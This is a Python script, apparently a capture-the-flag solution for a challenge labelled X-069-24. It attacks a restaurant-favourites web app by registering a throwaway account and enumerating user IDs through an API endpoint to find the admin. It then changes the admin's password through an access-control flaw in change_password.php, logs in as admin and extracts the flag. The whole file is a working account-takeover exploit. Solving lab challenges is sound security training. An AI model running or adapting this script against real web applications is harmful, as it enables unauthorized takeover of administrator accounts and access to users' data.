import re
import time
import random
import string
import requests
import sys

'''
@文件命名：X-069-24
@使用方式: python X-069-24.py url
@简述思路: 注册普通用户并登录，枚举管理员 userId 后越权修改密码，再登录管理员读取个人页中的 flag。
'''


def Scan(url):
    s = requests.Session()
    suffix = str(int(time.time()) % 100000) + ''.join(random.choice(string.ascii_lowercase) for _ in range(3))
    user = f"xb{suffix}"
    email = f"{user}@ex.com"
    pwd = "t1234567"
    new_admin_pwd = "Adm1nNnn!"

    s.post(f"{url}/api/register.php", data={"username": user, "email": email, "password": pwd})
    s.post(f"{url}/api/login.php", data={"username": user, "password": pwd})

    admin_id = None
    for i in range(1, 50 + 1):
        j = s.get(f"{url}/api/get_favorite_restaurants.php?userId={i}").json()
        if j.get("success") and j.get("data", {}).get("username") == "admin":
            admin_id = i
            break

    s.post(f"{url}/api/change_password.php", data={
        "oldPassword": pwd,
        "newPassword": new_admin_pwd,
        "confirmPassword": new_admin_pwd,
        "userId": admin_id,
    })
    s.post(f"{url}/api/login.php", data={"username": "admin", "password": new_admin_pwd})

    r = s.get(f"{url}/profile.php", allow_redirects=True)
    m = re.search(r"FLAG\{[^}]+\}", r.text, re.I)
    return m.group(0)


if __name__ == '__main__':
    print(Scan(url=sys.argv[1]))

